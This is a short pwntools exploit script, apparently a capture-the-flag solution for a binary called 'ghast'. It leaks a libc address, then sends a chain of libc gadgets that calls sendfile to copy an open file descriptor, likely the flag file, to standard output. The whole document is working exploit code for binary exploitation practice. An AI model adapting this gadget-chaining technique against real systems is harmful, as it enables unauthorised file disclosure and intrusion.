#!/usr/bin/env python3

from pwn import *

import os
os.chdir("./patched")

exe = ELF("./ghast_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("box.acmcyber.com", 31142)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript='''
            ''')
    return r


def main():
    r = conn()

    if args.REMOTE:
        r.recvline()
    libc.address = int(r.recvline().strip(), 16) - libc.sym.printf
    log.info(f"{hex(libc.address)=}")

    payload = b''.join([
        p64(libc.address + 0x15d352), # 0x0000000015d352: mov rcx, [rsp+0x8]; mov rdi, rbp; call rcx;
        b'A' * 0x8,
        p64(libc.address + 0x2d832), # doubles as value for rcx - 0x0000000002d832: mov rdx, [rsp+0x60]; mov rsi, [rsp+0x50]; mov rdi, [rsp+0x58]; mov rax, [rsp+0x18]; call rax;
        p64(libc.sym.sendfile), # rax
        b'A' * 0x30,
        p64(3), # rsi
        p64(1), # rdi
        p64(0) # rdx
    ])
    assert len(payload) <= 0x200
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
